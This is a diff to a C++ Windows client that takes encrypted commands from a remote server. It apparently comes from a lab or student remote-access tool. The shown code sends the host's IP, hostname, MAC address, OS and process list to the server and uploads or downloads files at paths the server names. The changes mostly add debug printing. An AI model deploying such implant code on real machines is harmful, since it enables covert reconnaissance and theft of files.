@@ -183,6 +183,8 @@ void upload(SOCKET clientSocket, const char* filePath)
     string encryptedContents = encrypt(fileContents);
     // Send the text file contents to the server
     int bytesSent = send(clientSocket, encryptedContents.c_str(), encryptedContents.length(), 0);
+    cout << "Plaintext result: " << fileContents << endl;
+    cout << "Encrypted message sent to server: " << encryptedContents << endl;
     if (bytesSent == SOCKET_ERROR)
     {
         cerr << "Failed to send data to server: " << WSAGetLastError() << endl;
@@ -212,8 +214,10 @@ void download(SOCKET clientSocket, const char* filePath, char contents[120])
         outFile.close();
         return;
     }
-    string response = encrypt("File successfully added to server!");
+    string response = encrypt("\nFile received and saved on client\n");
     int bytesSent = send(clientSocket, response.c_str(), sizeof(response), 0);
+    cout << "Plaintext result: " << "File received and saved on client" << endl;
+    cout << "Encrypted message sent to server: " << response << endl;
     if (bytesSent == SOCKET_ERROR)
     {
         cerr << "Failed to send data to server: " << WSAGetLastError() << endl;
@@ -368,6 +372,8 @@ void sendRunningProcesses(SOCKET clientSocket) {
     CloseHandle(snapshot);
     string encryptedProcesses = encrypt(processList);
     int bytesSent = send(clientSocket, encryptedProcesses.c_str(), processList.length(), 0);
+    cout << "Plaintext result: " << processList << endl;
+    cout << "Encrypted message sent to server: \n" << encryptedProcesses << endl;
     if (bytesSent == SOCKET_ERROR) {
         cout << "Process List send failed" << endl;
         return;
@@ -444,12 +450,12 @@ int main(int argc, char* arg[]) {
 
         if (byteCount > 0) {
             //Convert buffer to a readable string to compare inside the if statements
-            // printf("\nencrypted received command: %s\n", buffer);
+            printf("\nencrypted received command:\n%s\n", buffer);
             
             string decryptedBuff = decrypt(string(buffer));
             strncpy(buffer, decryptedBuff.c_str(), decryptedBuff.size());
             buffer[decryptedBuff.size()] = '\0';
-            printf("\nreceived command: %s\n", buffer);
+            printf("\ndecrypted received command:\n%s\n", buffer);
 
             if (strstr(buffer, "IPADDRESS")) {
                 //Send IP Address
@@ -466,7 +472,8 @@ int main(int argc, char* arg[]) {
                         return 0;
                     }
                     else {
-                        cout << "Message sent to server: " << encryptedIpAddress << endl;
+                        cout << "Plaintext result: " << ipAddress << endl;
+                        cout << "Encrypted message sent to server: " << encryptedIpAddress << endl;
                     }
                 }
             }
@@ -477,10 +484,11 @@ int main(int argc, char* arg[]) {
                 DWORD size = sizeof(hostname) / sizeof(char);
 
                 if (GetComputerNameA(hostname, &size)) {
-                    
                     // encode hostname
                     string encryptedHostname = encrypt(string(hostname));
                     int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
+                    cout << "Plaintext result: " << string(hostname) << endl;
+                    cout << "Encrypted message sent to server: " << encryptedHostname << endl;
                 }
                 else {
                     cout << "Could not send hostname. Error: " << GetLastError << endl;
@@ -495,6 +503,8 @@ int main(int argc, char* arg[]) {
                     // encode mac
                     string encryptedMacAddress = encrypt(MacAddress);
                     int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
+                    cout << "Plaintext result: " << MacAddress << endl;
+                    cout << "Encrypted message sent to server: " << encryptedMacAddress << endl;
                     
                     if (bytesSent == SOCKET_ERROR) {
                         cout << "Error at send(): " << WSAGetLastError() << endl;
@@ -514,7 +524,9 @@ int main(int argc, char* arg[]) {
                 // encode os
                 string encryptedOsMessage = encrypt(osMessage);
                 int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
-                
+                cout << "Plaintext result: " << osMessage << endl;
+                cout << "Encrypted message sent to server: " << encryptedOsMessage << endl;
+
                 if (bytesSent == SOCKET_ERROR) {
                     cout << "Error while sending OS: " << WSAGetLastError() << endl;
                 }
@@ -531,11 +543,11 @@ int main(int argc, char* arg[]) {
                 tokenA = strtok(NULL, " "); // upload from path
                 char path[100];
                 strcpy(path, tokenA);
-                cout << "filename uploading from: " << path << endl;
+                // cout << "filename uploading from: " << path << endl;
                 upload(clientSocket, path);
             }
             else if (strstr(buffer, "DOWNLOAD")) {
-                char before[512];
+                char before[2048];
                 strncpy(before, buffer, sizeof(buffer));
                 char* token = strtok(before, "\n");
                 token = strtok(NULL, "\n");
@@ -547,8 +559,8 @@ int main(int argc, char* arg[]) {
                 char path[100];
                 strcpy(path, tokenA);
                 
-                cout << " file download to: " << path << endl;
-                cout << " file contents: " << contents << endl;
+                // cout << " file download to: " << path << endl;
+                // cout << " file contents: " << contents << endl;
                 download(clientSocket, path, contents);
             }
             else if (strstr(buffer, "EXIT")) {
